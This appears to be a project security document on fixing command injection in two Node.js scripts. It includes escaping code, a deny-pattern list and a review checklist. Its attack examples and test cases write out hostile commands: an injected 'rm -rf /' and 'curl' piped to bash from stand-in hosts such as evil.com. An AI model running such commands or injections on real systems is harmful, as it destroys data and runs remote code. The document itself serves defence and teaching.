# Command Injection Prevention

## Overview

This document outlines the security measures implemented to prevent command injection vulnerabilities in scripts that execute shell commands.

## Affected Files

### Fixed Files

1. **skills/smart-git.js** - Git automation script
2. **skills/chain-commands.js** - Command chaining utility

## Vulnerabilities Identified

### 1. smart-git.js - Command Injection in Commit Messages

**Original Code (VULNERABLE)**:
```javascript
const message = process.argv[2];
execSync(`git commit -m "${message}"`, { stdio: 'inherit' });
```

**Issue**: Commit messages containing special characters like `"`, `` ` ``, `$`, or `;` could be used to inject arbitrary commands.

**Attack Example**:
```bash
node skills/smart-git.js "test"; rm -rf / #"
# Would execute: git commit -m "test"; rm -rf / #"
```

**Fix Applied**: Shell argument escaping
```javascript
function escapeShellArg(str) {
  return "'" + str.replace(/'/g, "'\\''") + "'";
}

const safeMessage = escapeShellArg(message);
execSync(`git commit -m ${safeMessage}`, { stdio: 'inherit' });
```

### 2. chain-commands.js - Arbitrary Command Execution

**Original Code (VULNERABLE)**:
```javascript
const commands = process.argv.slice(2);
for (const cmd of commands) {
  execSync(cmd, { stdio: 'inherit' });
}
```

**Issue**: Any command provided via command line would be executed without validation.

**Attack Example**:
```bash
node skills/chain-commands.js "rm -rf /" "curl malicious.com | bash"
```

**Fix Applied**: Command validation with allowlist and dangerous pattern detection
```javascript
function validateCommand(cmd) {
  // Check for dangerous patterns
  const dangerousPatterns = [
    /rm\s+-rf\s+\//, // Prevent deletion of root
    />\s*\/dev\//, // Prevent writing to device files
    /curl.*\|\s*bash/, // Prevent piping to shell
    /wget.*\|\s*sh/, // Prevent piping to shell
    /eval\s+/, // Prevent eval
    /exec\s+/, // Prevent exec
  ];
  
  for (const pattern of dangerousPatterns) {
    if (pattern.test(cmd)) {
      return false;
    }
  }
  
  return true;
}
```

## Security Measures Implemented

### 1. Shell Argument Escaping

**Purpose**: Safely pass user-provided strings as shell arguments

**Implementation**: 
- Wrap arguments in single quotes
- Escape any single quotes within the string using `'\''`

**Example**:
```javascript
// Input: Hello 'World'
// Output: 'Hello '\''World'\'''
```

**Why It Works**:
- Single quotes in shell prevent variable expansion and command substitution
- Escaping sequence `'\''` breaks out of quotes, adds escaped quote, and re-enters quotes

### 2. Command Validation

**Purpose**: Prevent execution of dangerous commands

**Approaches**:

1. **Allowlist Validation**: Check if command starts with known safe prefixes
   - `npm`, `node`, `git`, `npx`, etc.
   
2. **Dangerous Pattern Detection**: Block commands matching dangerous patterns
   - Root deletion: `rm -rf /`
   - Device file writes: `> /dev/sda`
   - Pipe to shell: `curl ... | bash`
   - Code execution: `eval`, `exec`

3. **User Warning**: Warn users about commands that don't match allowlist

### 3. Error Handling

**Improvements**:
- Display detailed error messages
- Graceful exit with appropriate exit codes
- Log attempted dangerous operations

## Best Practices for Safe Command Execution

### DO ✅

1. **Always validate and sanitize input**:
```javascript
function sanitizeInput(input) {
  // Remove or escape dangerous characters
  return input.replace(/[;&|`$()]/g, '');
}
```

2. **Use argument arrays when possible**:
```javascript
// Preferred: Arguments passed as array (Node.js handles escaping)
const { spawn } = require('child_process');
spawn('git', ['commit', '-m', message]);
```

3. **Escape shell arguments**:
```javascript
function escapeShellArg(str) {
  return "'" + str.replace(/'/g, "'\\''") + "'";
}
```

4. **Validate against allowlist**:
```javascript
const ALLOWED_COMMANDS = ['git', 'npm', 'node'];
if (!ALLOWED_COMMANDS.includes(command)) {
  throw new Error('Command not allowed');
}
```

5. **Use shellcheck for shell script validation**

### DON'T ❌

1. **Never directly interpolate user input into shell commands**:
```javascript
// DANGEROUS
execSync(`command ${userInput}`);
```

2. **Never use eval with user input**:
```javascript
// DANGEROUS
eval(userInput);
```

3. **Never trust input from command line arguments without validation**:
```javascript
// DANGEROUS
const cmd = process.argv[2];
execSync(cmd);
```

4. **Never allow arbitrary file paths without validation**:
```javascript
// DANGEROUS
const file = process.argv[2];
execSync(`cat ${file}`);
```

## Testing Command Injection Fixes

### Test Cases

1. **Test special characters in commit message**:
```bash
node skills/smart-git.js "test; echo hacked"
# Should commit: test; echo hacked (as literal text)
```

2. **Test backticks**:
```bash
node skills/smart-git.js "test `whoami`"
# Should commit: test `whoami` (as literal text)
```

3. **Test quotes**:
```bash
node skills/smart-git.js "test 'single' and \"double\" quotes"
# Should handle all quote types correctly
```

4. **Test dangerous commands**:
```bash
node skills/chain-commands.js "rm -rf /"
# Should be blocked with error message
```

5. **Test pipe to shell**:
```bash
node skills/chain-commands.js "curl http://evil.com | bash"
# Should be blocked with error message
```

## Code Review Checklist

When reviewing code for command injection vulnerabilities:

- [ ] Are there any uses of `exec`, `execSync`, `spawn`, or `spawnSync`?
- [ ] Is user input being interpolated into shell commands?
- [ ] Are command arguments properly escaped or passed as arrays?
- [ ] Is input validation performed before command execution?
- [ ] Are there tests for special characters and injection attempts?
- [ ] Is there error handling for invalid or dangerous commands?
- [ ] Are dangerous patterns (pipe to shell, eval, etc.) blocked?
- [ ] Is there logging for security events?

## Additional Security Resources

1. **OWASP Command Injection**: https://owasp.org/www-community/attacks/Command_Injection
2. **Node.js Security Best Practices**: https://nodejs.org/en/docs/guides/security/
3. **CWE-78: OS Command Injection**: https://cwe.mitre.org/data/definitions/78.html

## Reporting Security Issues

If you discover a command injection vulnerability or any other security issue:

1. **DO NOT** create a public GitHub issue
2. Report privately to the security team
3. Include:
   - Description of the vulnerability
   - Steps to reproduce
   - Potential impact
   - Suggested fix (if available)

## Version History

- **2026-02-01**: Initial security fixes for smart-git.js and chain-commands.js
  - Added shell argument escaping
  - Implemented command validation
  - Added dangerous pattern detection
  - Improved error handling
